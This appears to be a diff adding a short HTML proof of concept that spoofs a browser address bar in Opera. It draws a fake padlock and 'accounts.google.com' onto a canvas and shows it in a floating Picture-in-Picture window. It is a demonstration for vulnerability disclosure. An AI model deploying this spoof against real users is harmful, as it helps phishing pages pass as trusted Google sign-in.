@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Opera PiP Address Bar Spoof PoC</title>
+  <style>
+    video {
+      width: 600px;
+      border: 2px solid black;
+    }
+    #fakebar {
+      font-family: Arial, sans-serif;
+      background: #f1f3f4;
+      padding: 8px;
+      border-bottom: 1px solid #ccc;
+    }
+    #padlock {
+      color: green;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <h2>Opera PiP Spoof Demo</h2>
+  <button id="exploit">Launch Fake Google</button>
+  
+  <video id="vid" autoplay loop muted playsinline>
+    <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+  </video>
+
+  <script>
+    const btn = document.getElementById('exploit');
+    const vid = document.getElementById('vid');
+
+    btn.onclick = async () => {
+      // Generate spoofed UI as video overlay
+      const canvas = document.createElement("canvas");
+      canvas.width = 800; canvas.height = 80;
+      const ctx = canvas.getContext("2d");
+      
+      ctx.fillStyle = "#f1f3f4";
+      ctx.fillRect(0,0,800,80);
+      ctx.fillStyle = "green";
+      ctx.fillText("🔒 https://accounts.google.com", 20, 50);
+      
+      const fakeBar = canvas.captureStream();
+      vid.srcObject = fakeBar; // replace vid feed
+      
+      // Enter PiP (floating window with no trusted UI)
+      try {
+        await vid.requestPictureInPicture();
+        alert("Fake Google address bar now floating! 🚨");
+      } catch(e) {
+        console.error(e);
+      }
+    }
+  </script>
+</body>
+</html>
